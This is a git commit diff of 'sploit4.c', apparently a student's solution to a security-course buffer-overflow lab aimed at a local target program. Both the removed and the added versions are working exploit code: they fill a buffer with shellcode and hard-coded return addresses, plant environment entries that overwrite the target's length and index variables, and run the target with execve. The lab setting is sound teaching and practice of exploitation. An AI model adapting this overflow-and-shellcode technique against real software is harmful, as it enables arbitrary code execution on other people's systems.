649bb711d411d9258f3b308134ed6f04d810542c
Chuyue Zhang <70104294+IronDumpling@users.noreply.github.com>
2024-02-03 17:15:27 -0500

    Update sploit4.c

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -5,115 +5,49 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target4"
-
-/*
-  (gdb) p &buf
-  $1 = (char (*)[156]) 0x3021fdf0
-  (gdb) p &len
-  $2 = (int *) 0x3021fe9c
-  (gdb) p &i
-  $3 = (int *) 0x3021fe98
-*/
+#define LENGTH 169
+#define ADDR_LEN 4
 
 int main(void)
 {
   char *args[3];
-  char *env[1];
+  char *env[7];
 
-  char buf[189];
+  char exploit[LENGTH] = "";
+
   int i;
-
-  // Fill up the buffer with NOP
-  for (i = 0; i < 189; i++) {
-      buf[i] = '\x90';
+  while(i < LENGTH / ADDR_LEN){
+	  strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
+	  i++;
   }
 
-  // Inject shellcode
-  int shellcode_len = strlen(shellcode);
-  for (int i = 0; i < shellcode_len; i++) {
-      buf[i] = shellcode[i];
+  strcat(exploit, "\x94\x00\x00\x00"); // i = 148 
+
+  for(i = 0; i < strlen(shellcode); i++){
+    exploit[i] = shellcode[i];
   }
 
-  // i, pad \x01 because it should not be \x90 or \x00, so fill in small values
-  buf[168] = '\xff';
-  buf[169] = '\x01';
-  buf[170] = '\x01';
-  buf[171] = '\x01';
-
-  // len
-  buf[172] = '\xff';
-  buf[173] = '\x01';
-  buf[174] = '\x01';
-  buf[175] = '\x01';
-
-  // buffer
-  buf[184] = '\xf0';
-  buf[185] = '\xfd';
-  buf[186] = '\x21';
-  buf[187] = '\x30';
-
-  args[0] = TARGET;
-  args[1] = buf;
+  args[0] = TARGET; 
+  args[1] = exploit; 
   args[2] = NULL;
+  
+  env[0] = "\x00";
+  env[1] = "\x00";
 
-  env[0] = NULL;
+  env[2] = "\xa8\x00\x00\x00"; // len = 168
+  env[3] = "\x00";
+  env[4] = "\x00";
+  
+  env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30";
+  env[6] = NULL;
+
+  print_argv(args, env);
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
-  return (0);
+  return 0;
 }
-
-// #include <stdio.h>
-// #include <stdlib.h>
-// #include <string.h>
-// #include <unistd.h>
-// #include "shellcode-64.h"
-
-// #define TARGET "../targets/target4"
-// #define LENGTH 169
-// #define ADDR_LEN 4
-
-// int main(void)
-// {
-//   char *args[3];
-//   char *env[7];
-
-//   char exploit[LENGTH] = "";
-
-//   int i;
-//   while(i < LENGTH / ADDR_LEN){
-// 	  strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
-// 	  i++;
-//   }
-
-//   strcat(exploit, "\x94\x00\x00\x00"); // i = 148 
-
-//   for(i = 0; i < strlen(shellcode); i++){
-//     exploit[i] = shellcode[i];
-//   }
-
-//   args[0] = TARGET; 
-//   args[1] = exploit; 
-//   args[2] = NULL;
-  
-//   env[0] = "\x00";
-//   env[1] = "\x00";
-
-//   env[2] = "\xa8\x00\x00\x00"; // len = 168
-//   env[3] = "\x00";
-//   env[4] = "\x00";
-  
-//   env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30";
-//   env[6] = NULL;
-
-//   print_argv(args, env);
-
-//   if (0 > execve(TARGET, args, env))
-//     fprintf(stderr, "execve failed.\n");
-
-//   return 0;
-// }
 
 // Printing char *argv[]:
 // argv[0] Printing Hex Code:
